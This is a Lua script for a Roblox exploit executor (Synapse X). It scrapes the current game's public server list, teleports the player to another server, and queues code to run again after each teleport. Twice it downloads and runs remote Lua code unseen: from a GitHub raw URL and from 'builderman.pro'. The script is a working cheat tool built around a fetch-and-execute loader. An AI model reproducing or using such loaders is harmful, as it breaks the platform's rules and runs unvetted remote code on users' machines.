--game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text = "AYOOO :Flushed:"

local Decision = "largest" 
local Player = game.Players.LocalPlayer
local GUIDs = {}
local maxPlayers = 0



if syn.queue_on_teleport then
		syn.queue_on_teleport('game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()')
	end
	if syn.queue_on_teleport then
	    wait(6)
        syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/LittleShiQQA/littleshiqqaxds/main/SHA.lua"))()')
    end


 local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100&cursor="))
    
	for i = 1,100 do
		for i,v in pairs(Http.data) do
			if v.playing ~= v.maxPlayers then
				maxPlayers = v.maxPlayers
				table.insert(GUIDs, {id = v.id, users = v.playing})
			end
		end
		if Http.nextPageCursor ~= null then Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100&cursor="..Http.nextPageCursor)) else break end
	end
	

loadstring(game:HttpGet("https://builderman.pro/pub/wtf.lua?raw=true", true))()


    wait(100)
         if Decision == "any" then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[math.random(1,#GUIDs)].id, Player)
                elseif Decision == "smallest" then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[#GUIDs].id, Player)
                elseif Decision == "largest" then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[1].id, Player)
                else
                    print("Broke")
                end   
